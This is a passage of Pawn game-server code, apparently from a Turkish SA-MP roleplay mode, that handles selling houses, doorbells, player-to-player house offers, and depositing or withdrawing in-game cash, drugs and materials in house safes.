		format(string, sizeof(string), "Bu ev satýlýktýr!\n Level: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[house][hLevel],house,HouseInfo[house][hValue]);
		HouseInfo[house][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[house][hExteriorX], HouseInfo[house][hExteriorY], HouseInfo[house][hExteriorZ]+0.5, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		new ip[32];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) adlý kiþi evini $%d'a sattý (ID %d).",GetPlayerNameEx(playerid),ip,house,HouseInfo[house][hValue]);
		Log("logs/house.log", string);
		return 1;
	}
	// (TEMPORARY - ZHAO NOTE) No second houses for now
	/*else if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house2][hExteriorX],HouseInfo[house2][hExteriorY],HouseInfo[house2][hExteriorZ]))
	{
		if(GetPVarInt(playerid, "SellHouseConfirm") == 0)
		{
			SetPVarInt(playerid, "SellHouseConfirm", 1);
			SendClientMessage(playerid, COLOR_WHITE, "Evini bedavaya satmak üzeresin. Bunun için para almayacaksýn.");
			SendClientMessage(playerid, COLOR_WHITE, "Evini satmaya eminsen, komutu tekrar yaz (/evisat).");
			return 1;
		}
		DeletePVar(playerid, "SellHouseConfirm");

		ClearHouse(house2);
		HouseInfo[house2][hLock] = 1;
		format(HouseInfo[house2][hOwner], 128, "Nobody");
		HouseInfo[house2][hGLUpgrade] = 1;
		PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
		format(string, sizeof(string), "~w~You have sold your property!");
		GameTextForPlayer(playerid, string, 4000, 3);
		PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
		if(PlayerInfo[playerid][pVW] == house2+60000)
		{
			SetPlayerInterior(playerid,0);
			SetPlayerPos(playerid,HouseInfo[house2][hExteriorX],HouseInfo[house2][hExteriorY],HouseInfo[house2][hExteriorZ]);
			PlayerInfo[playerid][pInt] = 0;
			PlayerInfo[playerid][pHouse2] = INVALID_HOUSE_ID;
		}
		//PlayerInfo[playerid][pInsurance] = 0;
		SaveHouses();

		PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
		GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
		GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
		GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);
		OnPlayerStatsUpdate(playerid);
		DestroyPickup(HouseInfo[house2][hPickupID]);
		HouseInfo[house2][hPickupID] = CreatePickup(1273, 23, HouseInfo[house2][hExteriorX], HouseInfo[house2][hExteriorY], HouseInfo[house2][hExteriorZ], -1);
		DestroyDynamic3DTextLabel(HouseInfo[house2][hTextID]);
		format(string, sizeof(string), "Bu ev satýlýktýr!\n Level: %d\nID: %d\nÜcret: $%d\nSatýn almak için /evsatinal",HouseInfo[house][hLevel],house,HouseInfo[house][hValue]);
		HouseInfo[house2][hTextID] = CreateDynamic3DTextLabel(string, COLOR_HOUSEGREEN, HouseInfo[house2][hExteriorX], HouseInfo[house2][hExteriorY], HouseInfo[house2][hExteriorZ]+0.5,20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 10.0);
		new ip[32];
		GetPlayerIp(playerid,ip,sizeof(ip));
		format(string,sizeof(string),"%s (IP: %s) adlý kiþi evini $%d'a sattý (ID %d).",GetPlayerNameEx(playerid),ip,house2,HouseInfo[house2][hValue]);
		Log("logs/house.log", string);
		return 1;
 	}*/
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Satabilmek için evinin kapýsýna yakýn olmalýsýn.");
	}
	return 1;
}


CMD:zilebas(playerid, params[])
{
	for(new h; h < sizeof(HouseInfo); h++) if(IsPlayerInRangeOfPoint(playerid, 3.0, HouseInfo[h][hExteriorX], HouseInfo[h][hExteriorY], HouseInfo[h][hExteriorZ])) {

		new
			string[75 + MAX_PLAYER_NAME];

		foreach(Player, i) if(GetPlayerVirtualWorld(i) == h + 60000 && GetPlayerInterior(i) == HouseInfo[h][hHInteriorWorld]) {
			format(string,sizeof(string),"%s adlý kiþinin evinin kapýsý çalýyor.", HouseInfo[h][hOwner]);
			SendClientMessage(i,COLOR_PURPLE,string);
			GameTextForPlayer(i, "~n~~n~~n~~n~~n~~n~~n~~n~~w~Kapi caliyor...", 4000,3);
		}
		format(string,sizeof(string),"* %s, elini kaldýrýr ve kapýnýn yanýndaki zile basýp, %s adlý kiþinin kapýsýný çalar.",GetPlayerNameEx(playerid), HouseInfo[h][hOwner]);
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	return 1;
}

CMD:evimisat(playerid, params[])
{
    new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
    if((PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) || (PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)) {
	    new
			string[128],
			giveplayerid,
			price;

	    if(sscanf(params, "ud", giveplayerid, price))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evimisat [Oyuncu ID/Ýsim] [fiyat]");

        if(price < 1)
			return SendClientMessage(playerid, COLOR_GREY, "Fiyat 0'dan yüksek olmak zorunda.");

        if(!IsPlayerConnected(giveplayerid))
			return SendClientMessage(playerid, COLOR_GREY, "Oyuncu oyunda deðil");

		if(PlayerInfo[giveplayerid][pHouse] != INVALID_HOUSE_ID)
			return SendClientMessage(playerid, COLOR_GRAD5, "Bu kiþinin zaten bir evi var.");

        if(PlayerInfo[giveplayerid][pHouse] != INVALID_HOUSE_ID && strcmp(GetPlayerNameEx(playerid), HouseInfo[PlayerInfo[giveplayerid][pHouse]][hOwner], true) == 0)
			return SendClientMessage(playerid, COLOR_GREY, "Bu kiþinin zaten bir evi var.");

        new
			house = PlayerInfo[playerid][pHouse],
			house2 = PlayerInfo[playerid][pHouse2];

        if(PlayerInfo[giveplayerid][pLevel] >= HouseInfo[PlayerInfo[playerid][pHouse]][hLevel]) {
			if(ProxDetectorS(8.0, playerid, giveplayerid)) {
				if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house][hExteriorX],HouseInfo[house][hExteriorY],HouseInfo[house][hExteriorZ])) {
					if(GetPVarInt(playerid, "SellMyTimer") > 0) {
						format(string, sizeof(string), "Tekrar satýþ teklifi yollamak için %d saniye beklemelisin.", GetPVarInt(playerid, "SellMyTimer"));
						SendClientMessage(playerid,COLOR_GREY,string);
						return 1;
					}
					HouseOffer[giveplayerid] = playerid;
					HousePrice[giveplayerid] = price;
					House[giveplayerid] = 1;
					format(string, sizeof(string), "* %s adlý kiþiye evini $%d'a satmak için teklif yolladýn.", GetPlayerNameEx(giveplayerid), price);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s sana, sahip olduðu evi $%d'a satmak istiyor, satýn almak için (/kabulet ev)", GetPlayerNameEx(playerid), price);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					SetPVarInt(playerid, "SellMyTimer", 30); SetTimerEx("OtherTimerEx", 1000, false, "ii", playerid, TYPE_SELLMYTIMER);
				}  else if(IsPlayerInRangeOfPoint(playerid, 4.0,HouseInfo[house2][hExteriorX],HouseInfo[house2][hExteriorY],HouseInfo[house2][hExteriorZ])) {
					HouseOffer[giveplayerid] = playerid;
					HousePrice[giveplayerid] = price;
					House[giveplayerid] = 2;
					format(string, sizeof(string), "* %s adlý kiþiye evini $%d'a satmak için teklif yolladýn.", GetPlayerNameEx(giveplayerid), price);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					format(string, sizeof(string), "* %s sana, sahip olduðu evi $%d'a satmak istiyor, satýn almak için (/kabulet ev)", GetPlayerNameEx(playerid), price);
					SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				} else SendClientMessage(playerid, COLOR_GREY, "Evinin yakýnýnda deðilsin");
			} else SendClientMessage(playerid, COLOR_GREY, "Bu kiþi senin yanýnda deðil");
        } else SendClientMessage(playerid, COLOR_GREY, "Evi satmaya çalýþtýðýn kiþinin leveli evi almak için yeterli deðil.");
    } else SendClientMessage(playerid, COLOR_WHITE, "Evin yok.");
    return 1;
}

CMD:evdenal(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));

	new string[128], amount, choice[32];

	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evdenal [isim] [miktar]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Para, Pot, Crack, Materyal");
		return 1;
	}

	PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
	PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
	GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
	GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
	GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0)
		{
			if(strcmp(choice, "Para", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]-=amount;
					PlayerInfo[playerid][pCash] += amount;
					format(string, sizeof(string), "Evinin kasasýndan $%d para çýkardýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz para çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) adlý kiþi evinin kasasýndan $%d aldý (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar para yok.");
				}
			}
			else if(strcmp(choice, "Pot", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hPot] >= amount)
				{
					if(PlayerInfo[playerid][pPot] > 500)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Zaten 500 gram potun var.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pPot] > 500)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "500 gramdan fazla pot taþýyamazsýn.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hPot]-=amount;
					PlayerInfo[playerid][pPot] += amount;
					format(string, sizeof(string), "Evinin kasasýndan %d gram pot çýkardýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz pot çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of pot from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar pot yok.");
				}
			}
			else if(strcmp(choice, "Materyal", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials]-=amount;
					PlayerInfo[playerid][pMats] += amount;
					format(string, sizeof(string), "Evinin kasasýndan %d materyal çýkardýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz materyal çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) adlý kiþi evinin kasasýndan %d materyal aldý (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar materyal yok.");
				}
			}
			else if(strcmp(choice, "Crack", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse]][hCrack] >= amount)
				{
					if(PlayerInfo[playerid][pCrack] > 250)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Zaten 250 gram crackin var.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pCrack] > 250)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "You can't carry more than 250 grams of crack.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hCrack]-=amount;
					PlayerInfo[playerid][pCrack] += amount;
					format(string, sizeof(string), "Evinin kasasýndan %d gram crack aldýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz crack çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of crack from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar crack yok.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evdenal [name] [amount]");
				SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Cash, Pot, Crack, Materials");
			}
		}
	}


	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID && strcmp(playername, HouseInfo[PlayerInfo[playerid][pHouse2]][hOwner], true) == 0)
		{
			if(strcmp(choice, "Cash", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney]-=amount;
					PlayerInfo[playerid][pCash] += amount;
					format(string, sizeof(string), "Evinin kasasýndan $%d para çýkardýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz para çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) adlý kiþi evinin kasasýndan $%d aldý (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar para yok.");
				}
			}
			else if(strcmp(choice, "Pot", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hPot] >= amount)
				{
					if(PlayerInfo[playerid][pPot] > 500)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Zaten 500 gram potun var.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pPot] > 500)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "500 gramdan fazla pot taþýyamazsýn.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hPot]-=amount;
					PlayerInfo[playerid][pPot] += amount;
					format(string, sizeof(string), "Evinin kasasýndan %d gram pot çýkardýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz pot çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of pot from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar pot yok.");
				}
			}
			else if(strcmp(choice, "Materials", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hMaterials]-=amount;
					PlayerInfo[playerid][pMats] += amount;
					format(string, sizeof(string), "Evinin kasasýndan %d materyal çýkardýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz materyal çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) adlý kiþi evinin kasasýndan %d materyal aldý (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar materyal yok.");
				}
			}
			else if(strcmp(choice, "Crack", true, strlen(choice)) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az çýkaramazsýn.");
					return 1;
				}
				if(HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack] >= amount)
				{
					if(PlayerInfo[playerid][pCrack] > 250)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Zaten 250 gram crackin var.");
						return 1;
					}
					if(amount+PlayerInfo[playerid][pCrack] > 250)
					{
					    SendClientMessage(playerid, COLOR_GRAD2, "250 gramdan fazla crack taþýyamazsýn.");
					    return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse2]][hCrack]-=amount;
					PlayerInfo[playerid][pCrack] += amount;
					format(string, sizeof(string), "Evinin kasasýndan %d gram crack aldýn.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi evinin kasasýndan biraz crack çýkarýr.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has withdrawn %d grams of crack from their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse2]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Alabileceðin o kadar crack yok.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evdenal [isim] [miktar]");
				SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Para, Pot, Crack, Materyal");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Herhangi bir evin içinde deðilsin.");
		return 1;
	}
	return 1;
}

CMD:evekoy(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evekoy [name] [amount]");
		SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Para, Pot, Crack, Materyal");
		return 1;
	}

	PlayerInfo[playerid][pInt] = GetPlayerInterior(playerid);
	PlayerInfo[playerid][pVW] = GetPlayerVirtualWorld(playerid);
	GetPlayerIp(playerid, PlayerInfo[playerid][pIP], 32);
	GetPlayerPos(playerid, PlayerInfo[playerid][pPos_x], PlayerInfo[playerid][pPos_y], PlayerInfo[playerid][pPos_z]);
	GetPlayerFacingAngle(playerid, PlayerInfo[playerid][pPos_r]);

	if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse]+60000)
	{
		if(PlayerInfo[playerid][pHouse] != INVALID_HOUSE_ID)
		{
			if(strcmp(choice, "para", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pCash] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hSafeMoney]+=amount;
					PlayerInfo[playerid][pCash] -= amount;
					format(string, sizeof(string), "Evinin kasasýna $%d koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi cüzdanýndan biraz para çýkarýr ve evinin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) adlý kiþi evinin kasasýna $%d koydu (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklayabilecek paran yok.");
				}
			}
			else if(strcmp(choice, "pot", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pPot] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "Ayný anda 25 gramdan fazla saklayamazsýn.");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse]][hPot] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Evin zaten pot dolu!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hPot]+=amount;
					PlayerInfo[playerid][pPot] -= amount;
					format(string, sizeof(string), "Evinin kasasýna %d gram pot koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s cebinden biraz pot çýkarýr ve evinin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of pot into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklamak için yeterli potun yok.");
				}
			}
			else if(strcmp(choice, "materyal", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pMats] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse]][hMaterials]+=amount;
					PlayerInfo[playerid][pMats] -= amount;
					format(string, sizeof(string), "Evinin kasasýna %d materyal koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi biriz materyal çýkarýr ve evinin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %S) adlý kiþi evinin kasasýna %d materyal koydu (Ev ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklamak için yeterli materyalin yok.");
				}
			}
			else if(strcmp(choice, "crack", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pCrack] >= amount)
				{
					if(amount < 1 || amount > 25)
					{
						SendClientMessage(playerid, COLOR_GREY, "Ayný anda 25 gramdan fazla saklayamazsýn.");
						return 1;
					}
					if(amount + HouseInfo[PlayerInfo[playerid][pHouse]][hCrack] >= 250)
					{
						SendClientMessage(playerid, COLOR_GREY, "Evinin kasasý zaten crack dolu!");
						return 1;
					}
					HouseInfo[PlayerInfo[playerid][pHouse]][hCrack]+=amount;
					PlayerInfo[playerid][pCrack] -= amount;
					format(string, sizeof(string), "Evinin kasasýna %d gram crack koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					format(string,sizeof(string), "* %s adlý kiþi cebinden biraz crack çýkarýr ve evin kasasýna yerleþtirir.", GetPlayerNameEx(playerid));
					ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					SaveHouses();
					OnPlayerStatsUpdate(playerid);
					/*new ip[32];
					GetPlayerIp(playerid,ip,sizeof(ip));
					format(string,sizeof(string),"%s (IP: %s) has deposited %d grams of crack into their house (house ID %d).",GetPlayerNameEx(playerid),ip,amount,PlayerInfo[playerid][pHouse]);
					Log("logs/house.log", string);*/
				}
				else
				{
					SendClientMessage(playerid, COLOR_WHITE, "Saklamak için yeterli crackin yok.");
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /evekoy [isim] [miktar]");
				SendClientMessage(playerid, COLOR_GRAD2, "Kullanýlabilir Isimler: Para, Pot, Crack, Materyal");
			}
		}
	}
	else if(GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pHouse2]+60000)
	{
		if(PlayerInfo[playerid][pHouse2] != INVALID_HOUSE_ID)
		{
			if(strcmp(choice, "para", true) == 0)
			{
				if(amount < 1)
				{
					SendClientMessage(playerid, COLOR_WHITE, "Birden az saklayamazsýn.");
					return 1;
				}
				if(PlayerInfo[playerid][pCash] >= amount)
				{
					HouseInfo[PlayerInfo[playerid][pHouse2]][hSafeMoney]+=amount;
					PlayerInfo[playerid][pCash] -= amount;
					format(string, sizeof(string), "Evinin kasasýna $%d koydun.", amount);
					SendClientMessage(playerid, COLOR_YELLOW, string);
